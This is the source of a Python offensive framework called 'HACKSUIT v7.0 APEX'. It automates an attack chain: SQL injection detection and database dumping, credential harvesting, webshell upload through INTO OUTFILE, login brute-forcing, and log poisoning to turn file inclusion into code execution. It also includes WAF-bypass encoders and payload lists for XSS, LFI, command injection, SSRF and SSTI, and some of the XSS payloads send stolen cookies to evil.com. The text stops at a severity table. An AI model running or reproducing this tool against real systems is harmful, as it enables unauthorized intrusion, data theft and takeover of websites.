#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HACKSUIT v7.0 APEX EDITION — AI-Assisted Autonomous Attack Framework
Tác giả: palofsc
Điểm mới v7.0:
- AI Heuristic Engine: tự chấm điểm lỗ hổng, chọn payload thông minh
- Auto-Attack Chain: SQLi → dump → creds → login → upload shell → RCE
- Fast Mode: async-like với ThreadPool 200+ worker, connection pooling
- Credential Harvesting: auto-extract user:pass từ mọi nguồn
- Auto-Login Attack: thử login với creds tìm được + wordlist
- Smart Wordlist: chọn theo fingerprint (CMS/server/lang)
- Session Resumption: lưu tiến trình, chạy lại không mất dữ liệu
- PoC Generator: sinh curl/python PoC cho mỗi finding
- Real-time Dashboard: progress bars, stats
- Adaptive WAF bypass: học từ response
- Multi-vector parallelism: chạy đồng thời nhiều module
"""
import re, sys, os, time, string, argparse, subprocess, shutil, socket, random, json
import csv, base64, hashlib, hmac, threading, queue, ipaddress, concurrent.futures
import webbrowser, ssl, urllib.parse, pickle, gzip, io, zlib, binascii, statistics
import signal, atexit
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode, quote, unquote
from datetime import datetime

# ================== CÀI ĐẶT ==================
def _install(m):
    try: __import__(m.replace("-","_"))
    except ImportError:
        try: subprocess.check_call([sys.executable,"-m","pip","install",m,"--quiet","--user"])
        except Exception:
            try: subprocess.check_call([sys.executable,"-m","pip","install",m,"--quiet"])
            except Exception: pass

for _m in ["requests","bs4","colorama","tqdm"]: _install(_m)

import requests
from bs4 import BeautifulSoup
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=RESET=""
    class Style: BRIGHT=RESET_ALL=""
try:
    from tqdm import tqdm
except ImportError:
    tqdm = lambda x, **k: x
import urllib3
urllib3.disable_warnings()

# ================== CẤU HÌNH ==================
VERSION = "7.0 APEX"
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/8.5.0",
]
TIMEOUT, DELAY = 10, 0.05
PROXY, COOKIE, AUTH = None, None, None
REPORT_DIR = "reports"
SESSION_FILE = os.path.join(REPORT_DIR, ".session.json")
FAST_MODE = True
C = {"R":Fore.RED,"G":Fore.GREEN,"Y":Fore.YELLOW,"B":Fore.BLUE,
     "M":Fore.MAGENTA,"C":Fore.CYAN,"W":Fore.WHITE,"X":Fore.RESET}

def ensure_dir(d): os.makedirs(d, exist_ok=True)
def rand_marker(n=10): return "".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(n))
def rot_ua(): return {"User-Agent": random.choice(UA_POOL)}

def log(msg, level="INFO"):
    tag_map = {
        "INFO":C['B'],"OK":C['G'],"WARN":C['Y'],"VULN":C['R'],
        "AI":C['C'],"CHAIN":C['M'],"FAST":C['C'],"CREDS":C['R'],
        "EXPLOIT":C['R'],"WAF":C['Y'],"SQLMAP":C['M'],"NIKTO":C['M'],
        "SESSION":C['C'],"POC":C['G'],"HARVEST":C['R'],
    }
    print(f"{tag_map.get(level,C['W'])}[{level:9}]{C['X']} {msg}")

# ================== AI HEURISTIC ENGINE ==================
class AIEngine:
    """Chấm điểm lỗ hổng, chọn payload, đề xuất chain tấn công."""
    def __init__(self):
        self.history = []           # lịch sử response cho learning
        self.payload_scores = {}    # payload -> success rate
        self.waf_fingerprint = None
        self.server_profile = {}
        self.attack_graph = []      # chain các bước tấn công

    def fingerprint(self, headers, body):
        """Phân tích server profile"""
        h = {k.lower(): v for k, v in headers.items()}
        profile = {
            "server": h.get("server", ""),
            "powered": h.get("x-powered-by", ""),
            "framework": "",
            "lang": "",
            "cms": "",
        }
        body_l = body.lower()
        if "wp-content" in body_l or "wordpress" in body_l: profile["cms"] = "WordPress"
        elif "joomla" in body_l: profile["cms"] = "Joomla"
        elif "drupal" in body_l: profile["cms"] = "Drupal"
        if ".php" in body_l or "phpsessid" in str(h): profile["lang"] = "PHP"
        elif "jsessionid" in str(h): profile["lang"] = "Java"
        elif "asp.net" in str(h) or "__viewstate" in body_l: profile["lang"] = "ASP.NET"
        if "laravel" in str(h) or "xsrf-token" in body_l: profile["framework"] = "Laravel"
        elif "csrftoken" in body_l: profile["framework"] = "Django"
        elif "flask" in str(h): profile["framework"] = "Flask"
        self.server_profile = profile
        return profile

    def score_finding(self, vtype, evidence, response_code, response_len, time_delta=0):
        """Chấm điểm 0-100 dựa trên heuristic"""
        base = {
            "rce":95,"webshell":100,"error-based":90,"lfi":85,"ssti":90,
            "xxe":88,"ssrf":80,"boolean-based":75,"time-based":78,
            "nosql":82,"jwt-brute":88,"shellshock":95,"struts2-rce":95,
            "xss":65,"csrf":55,"cors":60,"crlf":62,"open_redirect":50,
            "host_header":58,"lfi-time":80,"api":40,"dir":35,"info":20,
        }.get(vtype, 40)
        bonus = 0
        if evidence: bonus += 5
        if response_code == 200: bonus += 5
        if response_len > 1000: bonus += 3
        if time_delta > 5: bonus += 4
        return min(100, base + bonus)

    def pick_payload(self, payloads, context):
        """Chọn payload dựa trên context + lịch sử"""
        if not payloads: return []
        # Nếu có WAF thì ưu tiên các payload đã từng bypass
        if self.waf_fingerprint:
            scored = [(p, self.payload_scores.get(p, 50)) for p in payloads]
            scored.sort(key=lambda x: -x[1])
            return [p for p, _ in scored]
        # Ngược lại, random shuffle
        random.shuffle(payloads)
        return payloads

    def record_result(self, payload, success):
        """Học từ kết quả"""
        cur = self.payload_scores.get(payload, 50)
        self.payload_scores[payload] = int(cur * 0.9 + (100 if success else 0) * 0.1)

    def propose_chain(self, findings):
        """Đề xuất chain tấn công dựa trên findings"""
        chain = []
        types = {f.get("type","") for f in findings}
        if "error-based" in types or "boolean-based" in types or "time-based" in types:
            chain.append("sqli_dump_creds")
        if "lfi" in types:
            chain.append("lfi_to_rce_log_poison")
        if "ssrf" in types:
            chain.append("ssrf_cloud_metadata")
        if "rce" in types or "webshell" in types:
            chain.append("upload_webshell")
            chain.append("post_exploit_enum")
        if "cors" in types and "xss" in types:
            chain.append("cors_xss_chain")
        if "jwt-brute" in types:
            chain.append("jwt_forge_admin")
        return chain

    def summary(self):
        return {"server": self.server_profile, "payloads_tested": len(self.payload_scores),
                "waf": self.waf_fingerprint}


# ================== ENGINE CHÍNH ==================
ERROR_PATTERNS = {
    "mysql":    [r"you have an error in your sql syntax", r"warning: mysql", r"mysqli?_",
                 r"mysql_fetch", r"check the manual that corresponds"],
    "mssql":    [r"microsoft sql server", r"unclosed quotation mark", r"oledb"],
    "postgres": [r"postgresql.*error", r"unterminated quoted string", r"pg_query"],
    "oracle":   [r"\bORA-\d{5}", r"quoted string not properly terminated"],
    "sqlite":   [r"sqlite3?\.\w+error", r"unrecognized token"],
}
TIME_PAYLOADS = {
    "mysql":    ["' AND SLEEP({t})-- -", "' AND BENCHMARK(50000000,SHA1('a'))-- -"],
    "mssql":    ["'; WAITFOR DELAY '0:0:{t}'-- -"],
    "postgres": ["'; SELECT pg_sleep({t})-- -"],
    "oracle":   ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{t})='a'-- -"],
    "sqlite":   ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -"],
}
WAF_ENCODERS = [
    ("raw",             lambda p: p),
    ("comment-space",   lambda p: p.replace(" ", "/**/")),
    ("double-comment",  lambda p: p.replace("UNION","UNI/**/ON").replace("SELECT","SE/**/LECT").replace(" ","/**/")),
    ("urlencode",       lambda p: quote(p)),
    ("double-urlencode",lambda p: quote(quote(p))),
    ("case-mix",        lambda p: re.sub(r"(union|select|from|and|or|sleep|benchmark)",
                                         lambda m: m.group(1).upper(), p, flags=re.I)),
    ("nullbyte",        lambda p: p.replace("'", "'%00").replace(" ", "%09")),
    ("unicode",         lambda p: p.replace("'", "%u0027").replace(" ", "%u0020")),
    ("plus-space",      lambda p: p.replace(" ", "+")),
    ("random-case",     lambda p: "".join(c.upper() if random.random()>0.5 else c.lower() for c in p)),
]


class Engine:
    def __init__(self, url=None, cookie=None):
        self.url = url
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": random.choice(UA_POOL),
                               "Accept":"text/html,application/xhtml+xml,*/*;q=0.8",
                               "Accept-Encoding":"gzip, deflate"})
        if cookie: self.s.headers["Cookie"] = cookie
        if PROXY: self.s.proxies = {"http":PROXY,"https":PROXY}
        if AUTH: self.s.auth = AUTH
        self.s.verify = False
        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=2)
        self.s.mount("http://", adapter)
        self.s.mount("https://", adapter)
        self.findings = []
        self.current = None
        self.dbms = None
        self.encoder = WAF_ENCODERS[0]
        self.ncols = None
        self.colpos = None
        self.waf = None
        self.shell_url = None
        self.creds = []  # harvested credentials [(user, pass, source)]
        self.ai = AIEngine()
        self.tested_urls = set()
        ensure_dir(REPORT_DIR)
        atexit.register(self.save_session)

    # -------- SESSION --------
    def save_session(self):
        try:
            data = {"url": self.url, "dbms": self.dbms, "waf": self.waf,
                    "shell_url": self.shell_url, "findings": self.findings,
                    "creds": self.creds}
            with open(SESSION_FILE, "w") as f: json.dump(data, f, default=str)
        except Exception: pass

    def load_session(self):
        try:
            with open(SESSION_FILE) as f:
                d = json.load(f)
            self.findings = d.get("findings", [])
            self.creds = d.get("creds", [])
            self.dbms = d.get("dbms")
            self.waf = d.get("waf")
            self.shell_url = d.get("shell_url")
            log(f"Loaded session: {len(self.findings)} findings", "SESSION")
        except Exception: pass

    # -------- REQUEST --------
    def req(self, url, data=None, method="GET", headers=None, allow_redirects=True, retries=2):
        for attempt in range(retries):
            if not FAST_MODE: time.sleep(DELAY)
            try:
                h = {"User-Agent": random.choice(UA_POOL)}
                if headers: h.update(headers)
                if method == "POST":
                    r = self.s.post(url, data=data, timeout=TIMEOUT, headers=h, allow_redirects=allow_redirects)
                else:
                    r = self.s.get(url, timeout=TIMEOUT, headers=h, allow_redirects=allow_redirects)
                if r.status_code == 429: time.sleep(3); continue
                # AI: học fingerprint
                if not self.ai.server_profile and self.url:
                    try: self.ai.fingerprint(r.headers, r.text)
                    except Exception: pass
                return r
            except requests.RequestException:
                if attempt == retries-1: return None
                time.sleep(0.5)
        return None

    # -------- WAF --------
    def detect_waf(self):
        sigs = {
            "Cloudflare": ["cf-ray","cf-cache-status","cloudflare"],
            "AWS": ["x-amzn-RequestId","x-amz-cf-id"],
            "F5": ["X-Cnection","X-WA-Info","BigIP"],
            "Akamai": ["akamai-grn","X-Akamai-Transformed"],
            "Sucuri": ["sucuri","X-Sucuri-ID"],
            "Imperva": ["incap_ses","X-Iinfo"],
            "ModSec": ["mod_security","NOYB"],
            "Wordfence": ["wfvt_","Wordfence"],
        }
        try:
            r = self.s.get(self.url, timeout=TIMEOUT)
            blob = (str(r.headers)+r.text).lower()
            for waf, sigs_list in sigs.items():
                for s in sigs_list:
                    if s.lower() in blob:
                        self.waf = waf; self.ai.waf_fingerprint = waf
                        log(f"WAF: {waf}", "WAF"); return waf
        except Exception: pass
        log("Không có WAF.", "OK"); return None

    # -------- PARAM EXTRACTION --------
    def extract_params(self):
        targets = []
        if self.url and urlparse(self.url).query:
            for p, v in parse_qsl(urlparse(self.url).query):
                targets.append({"url": self.url, "param": p, "base": v, "method": "GET", "data": None})
        r = self.req(self.url) if self.url else None
        if r:
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form"):
                action = urljoin(self.url, form.get("action") or self.url)
                fields = {i.get("name"): (i.get("value") or "test")
                          for i in form.find_all("input", {"name": True})
                          if i.get("type") != "submit"}
                if not fields: continue
                for p in fields:
                    targets.append({"url": action, "param": p, "base": fields[p],
                                    "method": (form.get("method") or "GET").upper(),
                                    "data": fields})
        return targets

    # -------- INJECT --------
    def inject(self, t, payload):
        if t["method"] == "POST":
            d = dict(t["data"]); d[t["param"]] = t["base"] + payload
            return self.req(t["url"], data=d, method="POST")
        qs = dict(parse_qsl(urlparse(t["url"]).query))
        qs[t["param"]] = t["base"] + payload
        u = urlparse(t["url"])
        return self.req(f"{u.scheme}://{u.netloc}{u.path}?{urlencode(qs)}")

    def send(self, payload):
        if self.encoder: payload = self.encoder[1](payload)
        return self.inject(self.current, payload)

    def detect_dbms(self, text):
        for dbms, pats in ERROR_PATTERNS.items():
            for p in pats:
                if re.search(p, text, re.I): return dbms
        return None

    # -------- SQLi --------
    def sqli_detect(self, t):
        self.current = t
        base = self.req(t["url"], data=t["data"], method=t["method"])
        if not base: return None
        for q in ["'", '"', "')", "';", "`)"]:
            r = self.inject(t, q)
            if r:
                d = self.detect_dbms(r.text)
                if d: return {"type":"error-based","dbms":d}
        rt = self.inject(t, "' AND 1=1-- -"); rf = self.inject(t, "' AND 1=2-- -")
        if rt and rf and rt.text != rf.text:
            return {"type":"boolean-based","dbms":None}
        for dbms, pls in TIME_PAYLOADS.items():
            for pl in self.ai.pick_payload(pls, "time"):
                t0 = time.time()
                r = self.inject(t, pl.format(t=5))
                dt = time.time()-t0
                if r and dt > 4:
                    self.ai.record_result(pl, True)
                    return {"type":"time-based","dbms":dbms}
        return None

    def find_union(self):
        if not self.current: return False
        # Thử ORDER BY nhanh
        lo, hi = 1, 30
        while lo < hi:
            mid = (lo+hi)//2
            r = self.send(f"' ORDER BY {mid}-- -")
            if r and (self.detect_dbms(r.text) or "unknown column" in r.text.lower()):
                hi = mid
            else:
                lo = mid + 1
        n = lo - 1
        if n <= 0:
            for i in range(1, 30):
                r = self.send(f"' UNION SELECT {','.join(['NULL']*i)}-- -")
                if r and not self.detect_dbms(r.text):
                    n = i; break
        if n <= 0: return False
        self.ncols = n
        tag = rand_marker()
        for pos in range(n):
            parts = ["NULL"]*n
            parts[pos] = f"CONCAT(0x6c61726b,{tag},0x656e64)"
            r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
            if r and tag in r.text:
                self.colpos = pos
                log(f"UNION OK: {n} cols, display #{pos+1}", "OK")
                return True
        return False

    def uquery(self, inner):
        if self.ncols is None or self.colpos is None: return None
        parts = ["NULL"]*self.ncols
        parts[self.colpos] = f"CONCAT(0x6c61726b,IFNULL(({inner}),0x4e554c4c),0x656e64)"
        r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
        if not r: return None
        m = re.search(r"lark(.*?)end", r.text, re.S)
        return m.group(1) if m else None

    def sqli_dump(self, table, cols, limit=100):
        colstr = ",".join(cols[:8])
        inner = f"SELECT GROUP_CONCAT(CONCAT_WS(0x7c,{colstr}) SEPARATOR 0x3b7c3b) FROM (SELECT {colstr} FROM {table} LIMIT {limit}) x"
        val = self.uquery(inner)
        if val:
            log(f"DUMP {table} → {len(val.split(';|;'))} rows", "VULN")
            path = os.path.join(REPORT_DIR, f"dump_{table}_{int(time.time())}.txt")
            with open(path, "w", encoding="utf-8") as f: f.write(val.replace(";|;","\n"))
            # AI: trích xuất creds
            self.harvest_creds_from_text(val, f"sqli:{table}")
            return val
        return None

    def harvest_creds_from_text(self, text, source):
        """Auto harvest user:pass, email:pass từ bất kỳ text"""
        patterns = [
            r"([a-zA-Z0-9_.-]+@[a-zA-Z0-9.-]+)[|:\s]+([^\s|]{6,})",  # email:pass
            r"\b(admin|root|user|test|manager)\b[|:\s]+([a-zA-Z0-9!@#$%^&*_.-]{6,})",  # user:pass
            r"(\w+)[|:]\s*\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}",  # bcrypt
            r"(\w+)[|:]\s*[a-f0-9]{32}",  # md5
        ]
        for pat in patterns:
            for m in re.finditer(pat, text, re.I):
                u, p = m.group(1), m.group(2) if m.lastindex>=2 else m.group(1)
                if len(u) < 40 and len(p) < 100:
                    self.creds.append((u, p, source))
                    log(f"CREDS: {u}:{p} ({source})", "CREDS")

    # -------- MySQL/MSSQL RCE --------
    def sqli_writefile(self, path, content):
        hx = content.encode().hex()
        for p in [f"' UNION SELECT 0x{hx} INTO OUTFILE '{path}'-- -",
                  f"' UNION SELECT 0x{hx} INTO DUMPFILE '{path}'-- -"]:
            r = self.send(p)
            if r and "error" not in r.text.lower()[:300]:
                return True
        return False

    def auto_webshell(self):
        log("Auto upload webshell...", "EXPLOIT")
        payloads = [
            ("<?php system($_GET['c']); ?>", "shell.php"),
            ("GIF89a<?php system($_GET['c']); ?>", "img.php"),
        ]
        paths = ["/var/www/html/","/var/www/","/usr/share/nginx/html/",
                 "/srv/www/htdocs/","/var/www/html/uploads/","/app/","C:/inetpub/wwwroot/"]
        for content, fname in payloads:
            for base in paths:
                if self.sqli_writefile(base+fname, content):
                    u = urlparse(self.url)
                    for test_url in [f"{u.scheme}://{u.netloc}/{fname}",
                                     f"{u.scheme}://{u.netloc}/uploads/{fname}"]:
                        r = self.req(test_url + "?c=id")
                        if r and ("uid=" in r.text or "gid=" in r.text):
                            log(f"WEBSHELL: {test_url}?c=id", "EXPLOIT")
                            self.shell_url = test_url
                            self.findings.append({"url": test_url, "param":"c",
                                                  "type":"webshell","payload":fname,"method":"GET"})
                            return test_url
        return None

    def auto_dump_creds(self):
        """Chain: dump all tables chứa creds"""
        log("Auto dump DB để tìm creds...", "CHAIN")
        q_dbs = {"mysql":"SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
                 "postgres":"SELECT string_agg(datname,',') FROM pg_database",
                 "mssql":"SELECT STRING_AGG(name,',') FROM sys.databases"}
        dbs_raw = self.uquery(q_dbs.get(self.dbms or "mysql","SELECT database()")) or ""
        dbs = [d.strip() for d in dbs_raw.split(",") if d.strip()]
        if not dbs: dbs = ["information_schema"]
        cred_keywords = ["user","account","login","admin","credential","member","customer","staff"]
        for db in dbs[:5]:
            if db in ("mysql","information_schema","performance_schema","sys"): continue
            q_tab = {"mysql":f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'",
                     "postgres":"SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'",
                     "mssql":"SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'"}
            tabs_raw = self.uquery(q_tab.get(self.dbms or "mysql")) or ""
            for tbl in [t.strip() for t in tabs_raw.split(",") if t.strip()]:
                if any(k in tbl.lower() for k in cred_keywords):
                    log(f"Target table: {db}.{tbl}", "CHAIN")
                    q_col = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{tbl}'"
                    cols_raw = self.uquery(q_col) or ""
                    cols = [c.strip() for c in cols_raw.split(",") if c.strip()]
                    if cols: self.sqli_dump(tbl, cols[:8])

    # -------- AUTO LOGIN ATTACK --------
    def auto_login_attack(self):
        """Tấn công tất cả form login bằng creds thu thập được + wordlist"""
        log("=== AUTO LOGIN ATTACK ===", "CHAIN")
        r = self.req(self.url)
        if not r: return
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        if not forms: return
        wordlist = [("admin","admin"),("admin","password"),("admin","123456"),
                    ("root","root"),("root","toor"),("test","test"),
                    ("admin","admin123"),("administrator","administrator")]
        # Thêm creds đã harvest
        wordlist = list(set(self.creds + wordlist))
        for form in forms:
            action = urljoin(self.url, form.get("action") or self.url)
            inputs = form.find_all("input")
            uf = pf = None
            for i in inputs:
                n = i.get("name")
                if not n: continue
                t = (i.get("type") or "").lower()
                if t in ("text","email") or re.search(r"user|login|email|name", n, re.I): uf = n
                if t == "password": pf = n
            if not (uf and pf): continue
            log(f"Login form: {action} ({uf}/{pf})", "CHAIN")
            fail_kw = re.compile(r"invalid|incorrect|wrong|failed|error|sai|không đúng", re.I)
            for u, p in wordlist[:200]:
                d = {uf: u, pf: p}
                rr = self.req(action, data=d, method="POST", allow_redirects=True)
                if not rr: continue
                if rr.status_code in (200,302) and not fail_kw.search(rr.text):
                    if "login" not in rr.url and "signin" not in rr.url:
                        log(f"LOGIN SUCCESS: {u}:{p} → {action}", "CREDS")
                        self.findings.append({"url": action, "param": f"{u}:{p}",
                                              "type":"login_bypass","payload":f"{u}:{p}","method":"POST"})
                        self.creds.append((u, p, f"login:{action}"))
                        # Thử auto-exploit sau login
                        self.post_login_recon(rr)
                        break

    def post_login_recon(self, response):
        """Sau khi login thành công, tìm admin panel, upload, etc."""
        log("Post-login recon...", "CHAIN")
        soup = BeautifulSoup(response.text, "html.parser")
        admin_links = []
        for a in soup.find_all("a", href=True):
            href = a["href"].lower()
            if any(k in href for k in ["admin","dashboard","upload","settings","config","user"]):
                admin_links.append(urljoin(response.url, a["href"]))
        for link in admin_links[:10]:
            r = self.req(link)
            if r and r.status_code == 200:
                log(f"Admin page: {link}", "CHAIN")
                self.findings.append({"url": link, "param":"-", "type":"admin_panel",
                                      "payload":"post-login", "method":"GET"})

    # -------- WAF BYPASS --------
    def waf_bypass(self):
        if not self.current: return False
        markers = ["cloudflare","mod_security","forbidden","sucuri","imperva","akamai","blocked","firewall"]
        for name, enc in WAF_ENCODERS:
            self.encoder = (name, enc)
            r = self.send("' UNION SELECT NULL-- -")
            if r and not any(m in r.text.lower() for m in markers):
                log(f"WAF bypass: {name}", "WAF"); return True
        self.encoder = WAF_ENCODERS[0]; return False


# ================== CÁC MODULE QUÉT (dùng chung Engine) ==================
XSS_PAYLOADS = [
    '<script>alert(1)</script>','"><img src=x onerror=alert(1)>',"'><svg onload=alert(1)>",
    '<details open ontoggle=alert(1)>','<script>fetch("//evil.com?c="+document.cookie)</script>',
    '<img src=x onerror="fetch(\'//evil.com?c=\'+document.cookie)">',
]
LFI_PAYLOADS = [
    "../../../../etc/passwd","....//....//....//etc/passwd","/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd","/proc/self/environ",
    "../../../../var/log/apache2/access.log","..\\..\\..\\..\\windows\\win.ini",
]
RCE_PAYLOADS = ["; id","| id","$(id)","`id`","&& id","; whoami","; sleep 8","| sleep 8"]
SSRF_PAYLOADS = ["http://127.0.0.1","http://localhost:8080","http://169.254.169.254/latest/meta-data/",
                 "file:///etc/passwd","http://[::1]","http://2130706433"]
SSTI_PAYLOADS = [("{{7*7}}","49"),("${7*7}","49"),("<%= 7*7 %>","49"),("#{7*7}","49")]
NOSQL_PAYLOADS = ["username[$ne]=x&password[$ne]=x","{\"username\":{\"$ne\":null}}"]
CRLF_PAYLOADS = ["%0d%0aSet-Cookie:crlf=1","%0d%0aX-Injected:1"]
REDIR_PAYLOADS = ["//evil.com","http://evil.com","//google.com"]

def scan_xss(e):
    log("XSS scan...", "FAST")
    for t in e.extract_params():
        for i, pl in enumerate(XSS_PAYLOADS):
            tag = f"ai{i}"
            payload = pl.replace("alert(1)", f"alert('{tag}')")
            r = e.inject(t, payload)
            if r and tag in r.text:
                e.findings.append({"url":t["url"],"param":t["param"],"type":"xss",
                                   "payload":payload,"method":t["method"]})
                log(f"XSS: {t['param']}", "VULN"); break

def scan_lfi(e):
    log("LFI scan...", "FAST")
    for t in e.extract_params():
        for pl in LFI_PAYLOADS:
            r = e.inject(t, pl)
            if r and re.search(r"root:x:0:0:|\[extensions\]", r.text):
                e.findings.append({"url":t["url"],"param":t["param"],"type":"lfi",
                                   "payload":pl,"method":t["method"]})
                log(f"LFI: {t['param']}", "VULN")
                # auto chain log poison
                if "log" in pl:
                    e.inject(t, "<?php system($_GET['cmd']); ?>")
                    r2 = e.inject(t, pl+"?cmd=id")
                    if r2 and "uid=" in r2.text:
                        log("LFI→RCE chain!", "CHAIN")
                        e.findings.append({"url":t["url"],"param":t["param"],
                                           "type":"rce-via-lfi","payload":pl,"method":t["method"]})
                break

def scan_rce(e):
    log("RCE scan...", "FAST")
    for t in e.extract_params():
        for pl in RCE_PAYLOADS:
            t0 = time.time(); r = e.inject(t, pl); dt = time.time()-t0
            if r and re.search(r"uid=\d+|www-data|root:", r.text):
                e.findings.append({"url":t["url"],"param":t["param"],"type":"rce",
                                   "payload":pl,"method":t["method"]})
                log(f"RCE: {t['param']}", "VULN"); return
            if dt > 6 and "sleep" in pl:
                e.findings.append({"url":t["url"],"param":t["param"],"type":"rce-time",
                                   "payload":pl,"method":t["method"]})
                log(f"TIME RCE: {t['param']}", "VULN"); return

def scan_ssrf(e):
    log("SSRF scan...", "FAST")
    for t in e.extract_params():
        if not re.search(r"url|src|path|file|link|redirect|uri|host", t["param"], re.I): continue
        for pl in SSRF_PAYLOADS:
            r = e.inject(t, pl)
            if r and re.search(r"ami-id|root:x:0:0:|instance-id|metadata|localhost", r.text, re.I):
                e.findings.append({"url":t["url"],"param":t["param"],"type":"ssrf",
                                   "payload":pl,"method":t["method"]})
                log(f"SSRF: {t['param']}", "VULN"); break

def scan_ssti(e):
    log("SSTI scan...", "FAST")
    for t in e.extract_params():
        for pl, exp in SSTI_PAYLOADS:
            r = e.inject(t, pl)
            if r and exp in r.text and pl not in r.text:
                e.findings.append({"url":t["url"],"param":t["param"],"type":"ssti",
                                   "payload":pl,"method":t["method"]})
                log(f"SSTI: {t['param']}", "VULN"); break

def scan_nosql(e):
    log("NoSQL scan...", "FAST")
    for t in e.extract_params():
        for pl in NOSQL_PAYLOADS:
            r = e.inject(t, pl) if t["method"]=="GET" else e.req(t["url"], data=pl, method="POST")
            if r and not re.search(r"invalid|incorrect|error", r.text, re.I):
                e.findings.append({"url":t["url"],"param":t["param"],"type":"nosql",
                                   "payload":pl,"method":t["method"]})
                log(f"NoSQL: {t['param']}", "VULN"); break

def scan_crlf(e):
    log("CRLF scan...", "FAST")
    for t in e.extract_params():
        for pl in CRLF_PAYLOADS:
            r = e.inject(t, pl)
            if r and ("crlf=1" in str(r.headers) or "X-Injected" in str(r.headers)):
                e.findings.append({"url":t["url"],"param":t["param"],"type":"crlf",
                                   "payload":pl,"method":t["method"]})
                log(f"CRLF: {t['param']}", "VULN"); break

def scan_redirect(e):
    log("Open Redirect scan...", "FAST")
    for t in e.extract_params():
        if not re.search(r"redirect|url|next|return|goto|dest", t["param"], re.I): continue
        for pl in REDIR_PAYLOADS:
            r = e.inject(t, pl)
            if r and r.history and "evil.com" in r.url:
                e.findings.append({"url":t["url"],"param":t["param"],"type":"open_redirect",
                                   "payload":pl,"method":t["method"]})
                log(f"Redirect: {t['param']}", "VULN"); break

def scan_fast(e):
    """Chạy song song nhiều module"""
    log("=== FAST MULTI-THREAD SCAN ===", "FAST")
    tasks = [scan_xss, scan_lfi, scan_rce, scan_ssrf, scan_ssti, scan_nosql, scan_crlf, scan_redirect]
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(tasks)) as ex:
        futures = [ex.submit(fn, e) for fn in tasks]
        for f in concurrent.futures.as_completed(futures):
            try: f.result()
            except Exception as ex2: log(f"Task err: {ex2}", "WARN")

# ================== DIRECTORY FUZZ NHANH ==================
DIRS = ["admin","login","wp-admin","phpmyadmin",".git",".env","config","backup","api",
        "v1","v2","swagger","graphql","docs","console","dashboard","uploads","files",
        ".htaccess","robots.txt","sitemap.xml",".git/HEAD","composer.json","package.json"]
DIR_EXTS = ["",".php",".bak",".old",".txt",".zip",".sql"]

def dir_fuzz_fast(e, threads=100):
    log("Dir fuzz...", "FAST")
    u = urlparse(e.url); root = f"{u.scheme}://{u.netloc}"
    base = e.req(root); base_code = base.status_code if base else 404
    def probe(path):
        try:
            r = e.s.get(f"{root}/{path}", timeout=4, allow_redirects=False,
                        headers={"User-Agent": random.choice(UA_POOL)})
            if r.status_code in (200,301,302,401,403) and r.status_code != base_code:
                return (path, r.status_code, len(r.text))
        except Exception: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(probe, d+ext) for d in DIRS for ext in DIR_EXTS]
        for f in concurrent.futures.as_completed(futs):
            res = f.result()
            if res:
                path, code, size = res
                col = C['R'] if code in (200,401,403) else C['Y']
                print(f"  {col}[{code}]{C['X']} {root}/{path} ({size}b)")
                if code == 200:
                    e.findings.append({"url":f"{root}/{path}","param":"-","type":"dir","method":"GET"})

# ================== AUTO ATTACK CHAIN ==================
def auto_attack_chain(e):
    log("═══════ AUTO ATTACK CHAIN ═══════", "CHAIN")
    # Bước 1: SQLi detect + exploit
    for t in e.extract_params():
        res = e.sqli_detect(t)
        if res:
            t.update(res); e.findings.append(t)
            e.dbms = e.dbms or res["dbms"]
            log(f"SQLi {t['param']} ({res['type']})", "VULN")
            e.current = t
            e.waf_bypass()
            if e.find_union():
                e.auto_dump_creds()
                if e.dbms == "mysql":
                    e.auto_webshell()
    # Bước 2: Fast multi-scan
    scan_fast(e)
    # Bước 3: Login attack với creds đã harvest
    if e.creds:
        log(f"Auto login với {len(e.creds)} creds...", "CHAIN")
    e.auto_login_attack()
    # Bước 4: AI chain đề xuất
    chain = e.ai.propose_chain(e.findings)
    if chain:
        log(f"AI chain: {' → '.join(chain)}", "AI")
    log("═══════ CHAIN DONE ═══════", "CHAIN")


# ================== REPORT + PoC ==================
SEVERITY = {
    "rce":"CRITICAL","rce-time":"CRITICAL","error-based":"CRITICAL","webshell":"CRITICAL",
    "lfi":"HIGH","ssrf":"HIGH","boolean-based":"HIGH","time-based":"HIGH",
    "ssti":"CRITICAL","xxe":"CRITICAL","nosql":"HIGH","jwt-brute":"CRITICAL",
    "login_bypass":"CRITICAL","rce-via-lfi":"CRITICAL","shellshock":"CRITICAL","struts2-rce":"CRITICAL",
    "xss":"MEDIUM","csrf":"MEDIUM","cors":"HIGH","crlf":"MEDIUM","open_redirect":"MEDIUM",
    "admin_panel":"HIGH","dir":"LOW","subdomain":"INFO","api":"INFO","info":"INFO",
}
